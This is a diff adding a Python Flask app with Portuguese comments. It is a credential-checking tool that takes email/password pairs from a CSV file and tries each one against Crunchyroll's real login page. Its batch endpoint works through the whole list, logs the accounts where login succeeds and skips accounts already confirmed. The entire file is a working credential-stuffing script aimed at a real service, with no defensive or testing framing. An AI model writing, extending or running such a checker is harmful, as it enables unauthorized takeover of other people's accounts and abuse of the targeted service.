@@ -1,0 +1,84 @@
+from flask import Flask, jsonify, request
+import pandas as pd
+import requests
+import logging
+
+app = Flask(__name__)
+
+# Configuração do logging para salvar os logs em um arquivo
+logging.basicConfig(filename='login_logs.txt',  
+                    level=logging.INFO,        
+                    format='%(asctime)s - %(levelname)s - %(message)s')  
+
+# Lista para armazenar e-mails de usuários já testados com sucesso
+usuarios_testados = set()
+
+# URL da página de login
+url_login = "https://sso.crunchyroll.com/pt-br/login"
+url_check = "https://www.crunchyroll.com/"  # URL para verificar o login
+
+tabela = pd.read_csv('dados2.csv')
+
+def realizar_login(email: str, senha: str):
+    session = requests.Session()
+
+    # Simulação do payload enviado para login
+    payload = {
+        'email': email,
+        'password': senha
+    }
+
+    # Tenta realizar o login
+    response = session.post(url_login, data=payload)
+
+    # Verifica o status de login
+    if response.ok and session.get(url_check).url != url_login:
+        return True  # Login bem-sucedido
+    return False  # Login falhou
+
+@app.route("/login", methods=["POST"])
+def login():
+    data = request.get_json()
+    email = data.get("email")
+    senha = data.get("senha")
+
+    if not email or not senha:
+        return jsonify({"error": "Email e senha são necessários"}), 400
+
+    if email in usuarios_testados:
+        return jsonify({"error": "Usuário já logado com sucesso anteriormente"}), 400
+
+    sucesso = realizar_login(email, senha)
+    if sucesso:
+        usuarios_testados.add(email)
+        logging.info(f"Login bem-sucedido para o e-mail: {email}")
+        return jsonify({"status": "sucesso", "email": email})
+    else:
+        logging.warning(f"Falha no login para o e-mail: {email}")
+        return jsonify({"error": "Falha no login"}), 401
+
+@app.route("/login/batch", methods=["POST"])
+def login_batch():
+    tabela = pd.read_csv('dados2.csv')
+    resultados = []
+
+    for linha in tabela.index:
+        email = tabela.loc[linha, "email"]
+        senha = str(tabela.loc[linha, "senha"])
+
+        if email in usuarios_testados:
+            continue
+
+        sucesso = realizar_login(email, senha)
+        if sucesso:
+            usuarios_testados.add(email)
+            logging.info(f"Login bem-sucedido para o e-mail: {email}")
+            resultados.append({"email": email, "status": "sucesso"})
+        else:
+            logging.warning(f"Falha no login para o e-mail: {email}")
+            resultados.append({"email": email, "status": "falha"})
+
+    return jsonify({"resultados": resultados})
+
+if __name__ == "__main__":
+    app.run(debug=True)
